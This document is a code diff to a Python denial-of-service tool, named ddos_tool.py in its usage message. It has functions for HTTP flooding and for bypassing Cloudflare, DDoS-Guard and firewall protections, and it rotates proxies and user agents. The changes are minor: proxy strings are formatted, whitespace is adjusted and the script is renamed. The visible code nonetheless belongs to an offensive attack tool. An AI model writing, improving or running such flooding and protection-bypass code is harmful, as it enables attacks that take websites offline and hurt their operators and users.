@@ -7,7 +7,7 @@ from typing import List
 
 def load_http_proxies(file_path: str) -> List[str]:
     with open(file_path, "r") as file:
-        return [line.strip() for line in file]
+        return [f"http://{line.strip()}" for line in file if ":" in line]
 
 def load_user_agents(file_path: str) -> List[str]:
     with open(file_path, "r") as file:
@@ -32,7 +32,7 @@ def bypass_cloudflare(target_url: str, http_proxies: List[str], user_agents: Lis
         }
 
         proxies = {
-            "http": proxy, 
+            "http": proxy,  
             "https": proxy  
         }
 
@@ -59,7 +59,7 @@ def bypass_ddos_guard(target_url: str, http_proxies: List[str], user_agents: Lis
         }
 
         proxies = {
-            "http": proxy, 
+            "http": proxy,  
             "https": proxy  
         }
 
@@ -86,7 +86,7 @@ def bypass_firewall(target_url: str, http_proxies: List[str], user_agents: List[
 
         proxies = {
             "http": proxy, 
-            "https": proxy  
+            "https": proxy 
         }
 
         response = requests.get(target_url, headers=headers, proxies=proxies, timeout=10)
@@ -129,7 +129,7 @@ def http_flood(target_url: str, http_proxies: List[str], user_agents: List[str])
         }
 
         proxies = {
-            "http": proxy, 
+            "http": proxy,  
             "https": proxy  
         }
 
@@ -154,11 +154,11 @@ def attack_thread(target_url: str, http_proxies: List[str], user_agents: List[st
             print("Invalid attack method. Available methods: http, cloudflare, firewall, ddos-guard, http-flood")
             sys.exit(1)
 
-        time.sleep(delay / 1000) 
+        time.sleep(delay / 1000)  
 
 def main():
     if len(sys.argv) != 5:
-        print("Usage: python3 httprun.py <target_url> <attack_method> <threads> <delay_ms>")
+        print("Usage: python3 ddos_tool.py <target_url> <attack_method> <threads> <delay_ms>")
         print("Available attack methods: http, cloudflare, firewall, ddos-guard, http-flood")
         sys.exit(1)
 
